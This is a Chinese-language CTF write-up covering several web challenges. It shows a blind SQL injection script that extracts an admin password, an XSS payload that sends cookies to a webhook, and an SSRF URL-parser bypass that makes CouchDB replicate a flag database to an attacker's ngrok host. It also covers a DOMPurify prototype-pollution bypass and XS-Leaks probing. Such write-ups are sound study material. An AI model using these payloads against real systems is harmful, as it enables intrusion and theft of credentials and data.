后来发现不是）\n看一下其他部分的源码，首先是init()\ndef init(): # this is terrible but who cares execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) execute(\u0026#39;DROP TABLE users;\u0026#39;) execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE users ( username TEXT PRIMARY KEY, password TEXT ); \u0026#39;\u0026#39;\u0026#39;) # put ginkoid into db ginkoid_password = generate_token() execute( \u0026#39;INSERT OR IGNORE INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;ginkoid\\\u0026#39;, \\\u0026#39;{ginkoid_password}\\\u0026#39;);\u0026#39; ) execute( f\u0026#39;UPDATE users SET password=\\\u0026#39;{ginkoid_password}\\\u0026#39;\u0026#39; f\u0026#39;WHERE username=\\\u0026#39;ginkoid\\\u0026#39;;\u0026#39; ) 然后是在创建用户create_user()和登录check_login()时都会检测用户名中是否有非法字符（白名单是26个英文字母大小写和数字），算是挺严格的\ndef create_user(username, password): if any(c not in allowed_characters for c in username): return (False, \u0026#39;Alphanumeric usernames only, please.\u0026#39;) if len(username) \u0026lt; 1: return (False, \u0026#39;Username is too short.\u0026#39;) if len(password) \u0026gt; 50: return (False, \u0026#39;Password is too long.\u0026#39;) other_users = execute( f\u0026#39;SELECT * FROM users WHERE username=\\\u0026#39;{username}\\\u0026#39;;\u0026#39; ) if len(other_users) \u0026gt; 0: return (False, \u0026#39;Username taken.\u0026#39;) execute( \u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39; # passwd部分可控 ) return (True, \u0026#39;\u0026#39;) 考虑了一下二次注入，因为注册时的passwd部分完全可控，设想是这样的\n构造passwd部分为 '),('ginkoid','passwd\nemmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时correct_password[0][0]==password，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是[0][0]，而新插入的passwd将是[1][0]；并且在init()时定义username是primary 也不可能有重复的\n————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现\n在看了这篇wp之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是\n'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';-- 其中的ON CONFLICT DO UPDATE SET，在这篇官方文档里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won\u0026rsquo;t do.\n最后使用盲注的方式，先上一下脚本 （这里是来源）再说说思路\nimport time import requests url = \u0026#34;https://cool.mc.ax/\u0026#34; # url = \u0026#34;http://127.0.0.1:5000/\u0026#34; prefix = \u0026#34;asdfjwfoijweoijfojiewfj\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#34; val = \u0026#34;\u0026#34; for i in range(32): username = prefix + str(time.time_ns()).replace(\u0026#34;0\u0026#34;, \u0026#34;\u0026#34;)\t# 注意白名单里没有0 要换掉 password = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; resp = requests.post(url + \u0026#34;register\u0026#34;, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password}).text for c in charset: resp = requests.post(url, data={\u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: c}).text if \u0026#34;Incorrect\u0026#34; not in resp: print(c) val += c break print(val) 注入点仍然是上文提到的/register路由中create_user(username,password)（当时找对了注入点，但是盲注这块还是做的少）\n主要的payload是\npassword = f\u0026#34;\u0026#39;||(select substr(password,{i+1},1) from users)||\u0026#39;\u0026#34; 这一句，当进入到注册流程时 会执行\nexcute(\u0026#39;INSERT INTO users (username, password)\u0026#39; f\u0026#39;VALUES (\\\u0026#39;{username}\\\u0026#39;, \\\u0026#39;{password}\\\u0026#39;);\u0026#39;) 即\nexcute(\u0026#39;INSERT INTO users(username, password)\u0026#39; values (\u0026#39;xxxxusernamexxxx\u0026#39;, \u0026#39;\u0026#39;||(select substr(password,n,1) from users)||\u0026#39;\u0026#39;)) 其中||连接两个不同的字符串，得到一个新的字符串；所以发送注册请求时password的值就是后面的查询语句select substr(password,n,1) from users，而查询语句返回的是substr(password,n,1) 是ginkoid这个账户的密码的其中一位，要获得这个值具体是什么 需要再有一个for in _ in charset遍历，在登录处 把这个值给试出来\n英文版讲解：The SELECT statement will take the character at index in ginkoid\u0026rsquo;s password, and concatenate it with \u0026lsquo;\u0026rsquo;, to be used as the new user\u0026rsquo;s password. We can then try logging in as our new user with every character in allowed_characters as the password. If we login successfully, then we know that we guessed the character correctly. Repeating this for all 32 characters gives us our password.\n获得密码后以ginkoid的账号登录，会得到一个mp3文件，但是并不是什么所谓的隐写 flag就在抓包后可以看到\n————其实还是有一点点疑问，为什么select substr(password,n,1) from users就能确保是ginoid的passwd呢？ginkoid是表中的第一条数据，在新建表后立刻插入，这就可以保证在查询的时候只查ginkoid的密码吗？\ndiscord之前有人问过这个问题，当时的解答是这是sqllite的特性，但是用sqllite在线工具尝试后发现也不是这样的 也会返回所有数据的substr(x,x,x)的值，但是确实是用这样的payload能做出来\n————后来想了一下 是这里的return correct_password[0][0]==password 确保了虽然sql查询语句返回的是很多个单一字母，但是是多行返回，仍然只会取到第一个；再加上username是主键 第一个插入，所以这个payload是可以的以一个事后诸葛亮的角度来看return correct_password[0][0]==password 这句代码 其实有暗示的成分在了\n————还有另一版的脚本 discord里收的import asyncio import random import aiohttp allowed = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789\u0026#39; url = \u0026#39;\u0026lt;https://cool.mc.ax/\u0026gt;\u0026#39; n = 32 final = dict() async def try_pass(sem, username, password, index): params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: password, } async with sem: async with aiohttp.ClientSession() as session: async with session.post(url, data=params) as resp: result = await resp.text() if \u0026#39;Incorrect\u0026#39; not in result: print(f\u0026#39;password[{index}]: {password}\u0026#39;) final[index] = password async def get_char(sem, index): # random username since otherwise we error username = \u0026#39;\u0026#39;.join(random.choices(allowed, k=32)) payload = f\u0026#34;\u0026#39;||(SELECT substr(password,{index+1},1) FROM users)||\u0026#39;\u0026#34; assert(len(payload) \u0026lt;= 50) params = { \u0026#39;username\u0026#39;: username, \u0026#39;password\u0026#39;: payload, } async with sem: async with aiohttp.ClientSession() as session: await session.post(url + \u0026#39;register\u0026#39;, data=params) tasks = [] for c in allowed: tasks.append(try_pass(sem, username, c, index)) await asyncio.gather(*tasks) async def main(): # without this we get an OSError due to too many open file descriptors sem = asyncio.Semaphore(300) index_tasks = [] for i in range(n): index_tasks.append(get_char(sem, i)) await asyncio.gather(*index_tasks) password = \u0026#39;\u0026#39; for i in range(len(final)): password += final[i] print(f\u0026#34;Password: {password}\u0026#34;) asyncio.run(main()) web/notes  Texting things to yourself, but online! notes.mc.ax\nPlease put a reasonably secure password when making an account\nReport problems here.\nDownloads - notes.tar.gz\n 先看页面 是个登录框，先填用户名和密码再点login或register，尝试test: test登入，界面是一个可以加notes 自定body和tag的app在view notes看到已经有人试过xss了，这里有个小小的越权漏洞，/view/+username直接可以看到其他的师傅在尝试什么样的payload（看了wp以后才意识到这里的tag部分就是注入点 而当时的我以为是卡bug了简单审了下源码，也没啥特别的，首先初始化一个admin号，flag在admin的private分类的notes中；对于个人发的notes会转义body部分为html实体来预防xss\n但是这个notes-app的形式是妥妥的xss了，那突破口在哪里捏？其实是被忽略的tag部分！一般情况下看到tag可选private/public就会不关注这里，但是配合特殊的DOM解析 这里无疑是注入点！下面简单分析一下，参考wp\n从/static/view.html中我们可以看到这个notes-app的前端渲染所凭借的模板长啥样\nbody部分被完全的保护了，但是tag没有过滤 只是限制了个数\n我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用\u0026lt;p\u0026gt; 另一个里面放\u0026lt;/p\u0026gt;，中间的部分会被放在一起）这里选用的是\u0026lt;style\u0026gt;这个tag，利用它onload的属性\n还有一个待解决的问题是上下两个notes之间会有\u0026lt;div class=\u0026quot;card\u0026quot;\u0026gt;的存在；这也是不用\u0026lt;iframe\u0026gt;和它的onload属性的原因，因为浏览器是不允许\u0026lt;iframe\u0026gt;中属性换行的\n我们最终的payload\nbody: anything tag: \u0026lt;style a=' body: anything tag: 'onload='` body: `;eval(somecode)/* tag: */'\u0026gt; 然后是常规的xss\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.open(\u0026#34;https://notes.mc.ax/view/\u0026lt;username\u0026gt;\u0026#34;, \u0026#34;navigator.sendBeacon(\u0026#39;\u0026lt;webhook server\u0026gt;\u0026#39;, document.cookie)\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; web/Requester  Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021\nrequester.mc.ax\nDownloads - requester-release.zip\n java可以说是完全不懂，比赛的时候就简单看了下就溜了，参考 解法1 - _replicator 解法2 - _find\n一个简单的java-app，检测给出的api是否正常 并且返回一个json\n给了docker\n先用jd-gui打开jar包看看源码\n先看Main.class\npublic class Main { public static Database db; public static String flag; public static void main(String[] args) { String adminUser = System.getenv(\u0026#34;adminUser\u0026#34;); String adminPassword = System.getenv(\u0026#34;adminPassword\u0026#34;); flag = System.getenv(\u0026#34;flag\u0026#34;); String javalinEnv = System.getenv(\u0026#34;javalinEnv\u0026#34;); db = new Database(adminUser, adminPassword); db.initializeDatabase(); JavalinJte.configure(createTemplateEngine(javalinEnv)); Javalin app = Javalin.create().start(8080); app.get(\u0026#34;/\u0026#34;, ctx -\u0026gt; ctx.render(\u0026#34;index.jte\u0026#34;)); app.get(\u0026#34;/createUser\u0026#34;, Handlers::createUser); app.get(\u0026#34;/testAPI\u0026#34;, Handlers::testAPI); } } 做一些初始化的工作，取出admin的用户名和密码以及flag的值，新建一个database，分出3个路由；\n先看database.class（分析的比较详细 之前做java很少\nprivate final String adminUsername; private final String adminPassword; public Database(String adminUsername, String adminPassword) { this.adminUsername = adminUsername; this.adminPassword = adminPassword; } private String getDbString() { return \u0026#34;http://\u0026#34; + this.adminUsername + \u0026#34;:\u0026#34; + this.adminPassword + \u0026#34;@couchdb:5984/\u0026#34;; } private boolean validateAlphanumeric(String name) { return name.matches(\u0026#34;^[a-zA-Z0-9_]*$\u0026#34;); } 存储从main.class里接收到的adminUsername\u0026amp;adminPassword；getDbString()返回一个可以用来连接couchdb数据库的url\npublic void createDatabase(String name) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); JSONObject res = HttpClient.putAPI(getDbString() + getDbString(), \u0026#34;\u0026#34;); if (!res.has(\u0026#34;ok\u0026#34;) || !res.getBoolean(\u0026#34;ok\u0026#34;)) throw new Exception(\u0026#34;Database creation failed\u0026#34;); } public void initializeDatabase() { try { createDatabase(\u0026#34;_replicator\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Replicator already initialized\u0026#34;); } try { createDatabase(\u0026#34;_users\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Users already initialized\u0026#34;); } try { createDatabase(\u0026#34;log\u0026#34;); } catch (Exception e) { Utils.logException(e); System.out.println(\u0026#34;Log already initialized\u0026#34;); } } 通过向构造好的url发送http请求来创建数据库，有三个默认的库：_replicator, _users, log\npublic void createUser(String name, String password) throws Exception { if (name.length() \u0026gt; 16 || !validateAlphanumeric(name)) throw new Exception(\u0026#34;Illegal name\u0026#34;); if (password.length() \u0026gt; 16 || !validateAlphanumeric(password)) throw new Exception(\u0026#34;Illegal password\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + \u0026#34;_users/org.couchdb.user:\u0026#34; + getDbString(), userObj.toString()); // ... boring java stuff  } public void addUserToDatabase(String dbName, String username) throws Exception { if (dbName.length() \u0026gt; 16 || !validateAlphanumeric(dbName)) throw new Exception(\u0026#34;Illegal dbname\u0026#34;); if (username.length() \u0026gt; 16 || !validateAlphanumeric(username)) throw new Exception(\u0026#34;Illegal username\u0026#34;); // ... boring java stuff  JSONObject res = HttpClient.putAPI(getDbString() + getDbString() + \u0026#34;/_security\u0026#34;, configObj.toString()); // ... boring java stuff  } public void insertDocumentToDatabase(String dbName, String document) throws Exception { // ... boring java stuff  JSONObject res = HttpClient.postAPI(getDbString() + getDbString(), document); // ... boring java stuff  } 这部分是创建用户并插入数据库中 并且插入一个文件，欸 用的也是http发请求这一招 这不就可控了？\n这里就完了，转去看Handlers.class\npublic static void createUser(Context ctx) { String username = (String)ctx.queryParam(\u0026#34;username\u0026#34;, String.class).get(); String password = (String)ctx.queryParam(\u0026#34;password\u0026#34;, String.class).get(); try { Main.db.createDatabase(username); Main.db.createUser(username, password); Main.db.addUserToDatabase(username, username); JSONObject flagDoc = new JSONObject(); flagDoc.put(\u0026#34;flag\u0026#34;, Main.flag); Main.db.insertDocumentToDatabase(username, flagDoc.toString()); ctx.result(\u0026#34;success\u0026#34;); } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } } 当发出一个请求 带着username和passwd时，它会调用createUser()创建一条用户的数据存入库中，并且存一个flagDoc；接着看最后一个testAPI\npublic static void testAPI(Context ctx) { String url = (String)ctx.queryParam(\u0026#34;url\u0026#34;, String.class).get(); String method = (String)ctx.queryParam(\u0026#34;method\u0026#34;, String.class).get(); String data = ctx.queryParam(\u0026#34;data\u0026#34;); try { URL urlURI = new URL(url); if (urlURI.getHost().contains(\u0026#34;couchdb\u0026#34;)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } catch (MalformedURLException e) { throw new BadRequestResponse(\u0026#34;Input URL is malformed\u0026#34;); } try { if (method.equals(\u0026#34;GET\u0026#34;)) { JSONObject jsonObj = HttpClient.getAPI(url); String str = jsonObj.toString(); } else if (method.equals(\u0026#34;POST\u0026#34;)) { JSONObject jsonObj = HttpClient.postAPI(url, data); String stringJsonObj = jsonObj.toString(); if (Utils.containsFlag(stringJsonObj)) throw new ForbiddenResponse(\u0026#34;Illegal!\u0026#34;); } else { throw new BadRequestResponse(\u0026#34;Request method is not accepted\u0026#34;); } } catch (Exception e) { throw new InternalServerErrorResponse(\u0026#34;Something went wrong\u0026#34;); } ctx.result(\u0026#34;success\u0026#34;); } 对给出的url（通过url参数进行提交）进行get或者post，先检查if (urlURI.getHost().contains(\u0026quot;couchdb\u0026quot;))，如果为真直接报错；之后发出请求 如果Utils.containsFlag(stringJsonObj)为真也会报错出去\n源码算是看完了，接下来想想解题的方法（有部分关于ssrf的前置知识可以看这篇鼻祖ppt - A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai）\n本地先起一个环境，run on localhost:8080，\n$ curl localhost:8080/testAPI?url=https://couchdb:5984/\\\u0026amp;method=GET Illegal! 由之前的代码分析我们知道因为couchdb的存在所以illegal，但是不太重要（反正终会被绕过）先创建一个用户\n$ curl http://localhost:8080/createUser?username=neptunian\\\u0026amp;password=neptunian # Creating user success $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq # Listing \u0026#34;neptunian\u0026#34; database documents, using our credentials (jq formats our JSON output) { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } } ] } $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00ed5b | jq # Check details of document id 99ea668366ac9d5d74fd2bc91c00ed5b { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{fake}\u0026#34; } 显然当我们新建一个用户时，我们的fake flag会被自动插入这个数据库中，并且直接curl是可以取出来的，但是题目是不能直接curl 需要缝合到限定的testAPI上，尝试构造一下~\n$ curl -vv http://localhost:8080/testAPI?method=GET\\\u0026amp;url=http://neptunian:neptunian\\@couchdb\\:5984\\@couchdb\\:5984/neptunian ... success 这样构造的url并不会触发filter，但是由于仅仅返回success而没有更多的信息，为了验证是不是触及到了couchdb server，我们可以尝试插入一个自定义的doc，这里用py脚本传\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # Simple POST Test params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/neptunian\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; }) ) ) # Local response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 2, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00ed5b\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-cee1919fc2eda9a6068ed2792608a9dd\u0026#34; } }, { \u0026#34;id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34; } } ] } # There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09! $ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 | jq { \u0026#34;_id\u0026#34;: \u0026#34;99ea668366ac9d5d74fd2bc91c00fd09\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-f8744c7d9e172ac4b188fbb8f337a204\u0026#34;, \u0026#34;some_int\u0026#34;: 1, \u0026#34;some_string\u0026#34;: \u0026#34;c\u0026#34; } 足以证明我们自己构造的带testAPI的缝合怪是可以正常执行couchdb相关的增删查改功能的\n而重要的是远程也能打通，这里有这么个好东西https://docs.couchdb.org/en/3.1.1/replication/replicator.html，我们只需要构造一组post数据就可以远程得到一份数据！\n{ \u0026#34;source\u0026#34;: \u0026#34;source_db_name\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;http://dest_user:dest_password@destination_host/dest_database\u0026#34; } 至于做法就很简单了：先用ngrok搞一个网上可访问的couchdb，得到临时的url https://2d0a4710580a.ngrok.io，先创建数据库来便于接收之后复制的数据\n$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag {\u0026#34;ok\u0026#34;:true} 然后就可以利用replicator和精心构造的json数据大搞特搞了！先本地\nimport requests import json headers = { \u0026#39;Accept\u0026#39;: \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026#39; } # POST Replication params = ( (\u0026#39;url\u0026#39;, \u0026#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate\u0026#39;), (\u0026#39;method\u0026#39;, \u0026#39;POST\u0026#39;), (\u0026#39;data\u0026#39;, json.dumps({ \u0026#34;source\u0026#34;: \u0026#34;neptunian\u0026#34;, \u0026#34;target\u0026#34;: \u0026#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag\u0026#34; }) ) ) # response = requests.get(\u0026#39;http://localhost:8080/testAPI\u0026#39;, headers=headers, params=params) response = requests.get(\u0026#39;https://requester.mc.ax/testAPI\u0026#39;, headers=headers, params=params) print(response.text) $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs | jq { \u0026#34;total_rows\u0026#34;: 1, \u0026#34;offset\u0026#34;: 0, \u0026#34;rows\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;key\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34; } } ] } $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 | jq { \u0026#34;_id\u0026#34;: \u0026#34;d139bf6ab1733d779f64e9c6c4026de9\u0026#34;, \u0026#34;_rev\u0026#34;: \u0026#34;1-4bb8f6dafef84b2d856fe1444f38b0a2\u0026#34;, \u0026#34;flag\u0026#34;: \u0026#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\u0026#34; } 好耶！复制怪好耶！\n虽然上面说了这么多，其实核心思路也挺清晰的，就是先认真分析源码 找出漏洞点是用couchdb创建用户时会自动插入flag 这个过程是使用http请求 我们很容易就可以构造一个url创建用户 让flag进入自己掌控的数据库中，之后就可以顺畅的进行数据库的增删查改；但是这还需要接上题目中给出的testAPI入口才行，又经过一些构造可以成功缝合；但是由于鸡贼的设置 testAPI处的请求只会返回成功或失败，为了确切的得到flag，我们利用了couchdb的_replicator这个好东西来进行一个数据的复制，得到flag~~~\n————以下是第二种解法: char-by-char-blind-sqli\n源码的分析不变，这是根本，差异之处首先在于构造url时这里利用了couchdb的另一个好东西_find\ncurl -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \u0026#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find\u0026#39; --data \u0026#39;{\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: \u0026#34;.*\u0026#34;}}}\u0026#39; 本地测试可以成功会显出flag；第二个差异在缝合testAPI的时候，由于filter对于大小写不太敏感，所以大写Couch来绕过了；同样面临回显只有成功或失败 但是char-by-char-blind-sqli无所畏惧~\nimport urllib.parse import requests import json import string # first, make a request to # /createUser?username=strellicsquad\u0026amp;password=12345 alphabet = \u0026#34;etoanihsrdlucgwyfmpbkvjxqz{}_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ\u0026#34; def test_regex(regex): url = \u0026#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find\u0026#34; data = json.dumps({\u0026#34;selector\u0026#34;:{\u0026#34;flag\u0026#34;: {\u0026#34;$regex\u0026#34;: regex}}}) r = requests.get(f\u0026#34;https://requester.mc.ax/testAPI/?url={urllib.parse.quote(url)}\u0026amp;method=POST\u0026amp;data={urllib.parse.quote(data)}\u0026#34;) return \u0026#34;Something went wrong\u0026#34; in r.text flag = \u0026#34;flag{\u0026#34; while not flag.endswith(\u0026#34;}\u0026#34;): for c in alphabet: check = \u0026#34;^\u0026#34; + flag + c + \u0026#34;.*\u0026#34; if test_regex(check): print(f\u0026#34;found {c}-\u0026gt; {flag}{c}\u0026#34;) flag += c break 也可以拿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}\n————最悲催的莫过于之后我也用docker在本地起了一个环境 但是初始化有问题，导致localhost:5984无法访问\n我搜了一下 有相关问题的解答 但都不明确……\n从这个报错看 应该是说题目相关的需要的database_does_not_exist，但是用于初始化的/_utils也无法访问，直接curl 127.0.0.1:5984也是失败，curl couchdb:5984也是失败，处理报错真是心累\nweb/requester-strikes-back  Java was found to not be the future. Can you take down requester again?\n 源码处有一处修改if (urlURI.getHost().toLowerCase().contains(\u0026quot;couchdb\u0026quot;))\n这使得我们不能用之前的Couchdb大写的方式来绕过，但是\n结合Incorrect handling of malformed authority component by URIUtils#extractHost\n我们只需要把之前的url改成http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find即可（解法二）\n解法一直接跑就行 一样能通\n相关的一些ssrf前置知识\u0026amp;url解析问题仍然可以看这里：A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - 🍊Orange Tsai（好厉害的ppt）\n参考：wp1 wp2\nweb/pastebin-1  Ah, the classic pastebin.\npastebin-1.mc.ax\nAdmin bot\nDownloads - main.rs\n pastebin，类似留言板的样子 可以发表paste\n第一反应就是xss，试一下alert(1) 成功弹窗题目另外提供了一个/admin-bot页面，这个，妥妥的xss好吧 直接xss platform一把梭！\n***web/pastebin-2-social-edition  Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.\npastebin-2-social-edition.mc.ax\nAdmin bot\n 这次adminbot会给自己的paste下面留言回复\n显然啊 还是xss，但是用了DOMPurify，并且这个版本也很新 之前的一些bug也没法利用，参考wp\n看源码\n注意到这里，如果有错误 就会设置errorContainer.innerHTML = message;，如果我们能控制error message 就能做到xss了；这里利用原型污染prototype pollution，即使DOMPurify可以阻挡一些xss常用的标签或者属性，也阻止不了原型污染\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 我们可以把error污染成任意值，message污染为xss内容和payload\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;__proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;error\u0026#34;] = \u0026#34;1\u0026#34;; {}[\u0026#34;__proto__\u0026#34;][\u0026#34;message\u0026#34;] = \u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34;; 当请求被触发时，error和message就都是我们自定的值了；虽然DOMPurify会对__proto__进行移除，但是因为上面const fieldsetName = decodeURIComponent(fieldset.name);，所以再对__proto__来一手urlencode就能绕过了\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;%255F_proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; ***web/pastebin-3  Boy, there sure are a lot of pastebins. Gotta think of new themes\u0026hellip;\nPlease put a reasonably secure password when making an account\n 还是一个很简单的页面 create paste，增加了一个搜索的功能\n先看/view路由\n我们的便签 总体会以一个url的形式放入iframe中，接着去看看sanbox_url的渲染情况\n而亮点是，我们的paste又被直接放入反引号中间了，如果我们用类似${alert(1)}的东西直接就可以跑js了！\n现在我们有了可以操作js代码的地方——但是这是在sandbox中，与主页面并不是同源的🤔\n再看看新加入的search功能\n————这里要先插播一条知识了 XSLeaks（更多的相关参考链接放到后面了），一个常见的xsleak攻击详见error events\nCross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. ——from XSLeaks wiki\n/search使用的是flask中的flash()消息闪现来展示搜索的结果，它会存储在session cookie中，如果消息比会话cookie大的话会导致消息闪现静默失败——我们利用这一条特性，用长长的cookie，如果请求成功 那么需要显示flash时cookie将会超过限制报错，而请求失败 就只有No results found短短的一条，不会报400\n我们用XSLeaks wiki上给出的 probeError snippet\nfunction probeError(url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; console.log(\u0026#39;Onload event triggered\u0026#39;); script.onerror = () =\u0026gt; console.log(\u0026#39;Error event triggered\u0026#39;); document.head.appendChild(script); } 虽然同站的cookies（same-site 